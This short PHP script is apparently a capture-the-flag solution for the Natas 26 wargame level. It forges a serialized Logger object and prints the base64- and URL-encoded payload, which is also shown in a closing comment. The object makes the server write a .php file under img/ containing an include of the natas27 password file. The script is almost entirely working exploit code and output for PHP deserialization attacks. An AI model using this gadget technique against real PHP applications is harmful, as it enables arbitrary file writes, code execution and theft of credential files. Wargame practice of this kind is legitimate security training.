 <?php
#
#     error_reporting(0);

     # Copy-pasted from the Natas26 Source-code
     class Logger{
         private $logFile;
         private $initMsg;
         private $exitMsg;

         function __construct($file){
             // initialise variables
             $this->initMsg="No input needed here";
             $this->exitMsg="<?php include('/etc/natas_webpass/natas27')?>";
             $this->logFile = "img/get_rekt.php";

             // write initial message
             $fd=fopen($this->logFile,"a+");
             fwrite($fd,$initMsg);
             fclose($fd);
         }
     }

     $object = new Logger("Get_rekt");
     echo urlencode(base64_encode(serialize($object)));
?>

# Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2dldF9yZWt0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIwOiJObyBpbnB1dCBuZWVkZWQgaGVyZSI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ1OiI8P3BocCBpbmNsdWRlKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpPz4iO30%3D
